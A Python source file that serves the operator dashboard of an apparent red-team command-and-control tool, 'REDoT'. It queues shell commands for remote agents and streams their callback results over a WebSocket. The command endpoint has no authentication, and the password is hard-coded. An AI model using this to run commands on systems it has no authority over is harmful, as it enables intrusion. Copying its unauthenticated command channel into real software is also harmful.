#!/usr/bin/env python3
# modules/dashboard_ws_server.py

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
import socketserver
import threading
import os
import json
import time
from websocket_server import WebsocketServer

AUTH_PASSWORD = "redot123"
CMD_FILE = "results/current_command.txt"
LOG_FILE = "results/agent_callbacks.log"
HTML_FILE = "dashboard.html"
clients = []

def notify_all(msg):
    for client in clients:
        server.send_message(client, json.dumps(msg))

class DashboardHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            try:
                with open(HTML_FILE) as f:
                    html = f.read()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(html.encode())
            except:
                self.send_error(500)
        else:
            self.send_error(404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length).decode()
        fields = parse_qs(data)
        if self.path == "/auth":
            if fields.get("pw", [""])[0] == AUTH_PASSWORD:
                self.send_response(200)
            else:
                self.send_response(403)
            self.end_headers()
        elif self.path == "/send":
            cmd = fields.get("cmd", [""])[0]
            with open(CMD_FILE, "w") as f:
                f.write(cmd.strip())
            self.send_response(200)
            self.end_headers()
        else:
            self.send_error(404)

class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    daemon_threads = True

def websocket_cb(client, server, message): pass
def websocket_new(client, server): clients.append(client)
def websocket_close(client, server): clients.remove(client)

def watch_callbacks():
    seen = set()
    while True:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                lines = f.readlines()
            for line in lines:
                if line not in seen:
                    seen.add(line)
                    try:
                        obj = json.loads(line.strip())
                        notify_all(obj)
                    except:
                        pass
        time.sleep(2)

def generate_html():
    html = """<!DOCTYPE html>
<html>
<head>
  <title>REDoT Web Dashboard</title>
  <style>
    body { background: #0f0f0f; color: #39ff14; font-family: monospace; padding: 20px; }
    h1, h2 { color: #00ffff; }
    .agent { margin: 5px 0; padding: 5px; border-bottom: 1px solid #00ffff; }
    .login { color: white; }
    input, button { font-family: monospace; background: black; color: #39ff14; border: 1px solid #00ffff; padding: 5px; }
    textarea { width: 100%; height: 100px; background: black; color: #39ff14; border: 1px solid #00ffff; }
  </style>
</head>
<body>
  <h1>REDoT Live Dashboard</h1>
  <div id="loginForm">
    <p class="login">Password: <input type="password" id="pw"><button onclick="login()">Login</button></p>
  </div>
  <div id="main" style="display:none">
    <h2>Send Command</h2>
    <input type="text" id="cmd" placeholder="e.g. uname -a"><button onclick="sendCommand()">Send</button>
    <h2>Live Callbacks</h2>
    <label>Filter by Agent:</label>
    <input type="text" id="filter" oninput="filterLogs()">
    <div id="logs"></div>
  </div>
  <script>
    let ws, logs = [];
    function login() {
      const pw = document.getElementById('pw').value;
      fetch('/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'pw=' + encodeURIComponent(pw)
      }).then(r => {
        if (r.status == 200) {
          document.getElementById('loginForm').style.display = 'none';
          document.getElementById('main').style.display = 'block';
          connectWebSocket();
        } else {
          alert('Access denied');
        }
      });
    }
    function connectWebSocket() {
      ws = new WebSocket("ws://" + location.hostname + ":8765");
      ws.onmessage = function(event) {
        let data = JSON.parse(event.data);
        logs.push(data);
        updateLogs();
      };
    }
    function updateLogs() {
      const filter = document.getElementById('filter').value.toLowerCase();
      const div = document.getElementById('logs');
      div.innerHTML = '';
      logs.filter(e => !filter || (e.host || '').toLowerCase().includes(filter)).forEach(e => {
        let el = document.createElement('div');
        el.className = 'agent';
        el.textContent = `[${e.host}] → ${e.result}`;
        div.appendChild(el);
      });
    }
    function filterLogs() { updateLogs(); }
    function sendCommand() {
      const cmd = document.getElementById('cmd').value;
      fetch('/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'cmd=' + encodeURIComponent(cmd)
      });
    }
  </script>
</body>
</html>"""
    with open(HTML_FILE, "w") as f:
        f.write(html)

def run_all():
    os.makedirs("results", exist_ok=True)
    if not os.path.exists(HTML_FILE):
        generate_html()
    with open(CMD_FILE, "w") as f:
        f.write("")

    threading.Thread(target=watch_callbacks, daemon=True).start()
    threading.Thread(target=lambda: ThreadedHTTPServer(('0.0.0.0', 8080), DashboardHandler).serve_forever(), daemon=True).start()

    global server
    server = WebsocketServer(port=8765, host='0.0.0.0')
    server.set_fn_new_client(websocket_new)
    server.set_fn_client_left(websocket_close)
    server.set_fn_message_received(websocket_cb)
    server.run_forever()

if __name__ == "__main__":
    run_all()
